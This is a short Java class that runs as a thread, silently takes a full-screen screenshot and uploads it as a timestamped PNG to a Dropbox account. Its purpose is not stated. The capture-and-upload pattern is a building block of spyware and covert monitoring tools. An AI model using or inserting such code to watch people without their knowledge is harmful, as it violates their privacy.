import com.dropbox.core.v2.DbxClientV2;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.text.SimpleDateFormat;
import java.util.Date;

public class Screen extends Thread
{
    private DbxClientV2 dropboxClient;
    public Screen(DbxClientV2 a)
    {
        dropboxClient = a;
    }

    @Override
    public void run()
    {
        SimpleDateFormat formatter = new SimpleDateFormat("yyyyMMdd_HHmmss");
        Date now = new Date();
        String fileName = formatter.format(now);
        Robot robot = null;
        try {
            robot = new Robot();
        } catch (AWTException e) {
            e.printStackTrace();
        }
        BufferedImage screenShot = robot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
        ByteArrayOutputStream os = new ByteArrayOutputStream();
        try {
            ImageIO.write(screenShot, "png", os);
        } catch (IOException e) {
            e.printStackTrace();
        }

        try {
            InputStream is = new ByteArrayInputStream(os.toByteArray());
            dropboxClient.files().uploadBuilder("/" + fileName + ".png")
                    .uploadAndFinish(is);
        } catch (Exception ex) {
            ex.printStackTrace();
        }

    }
}
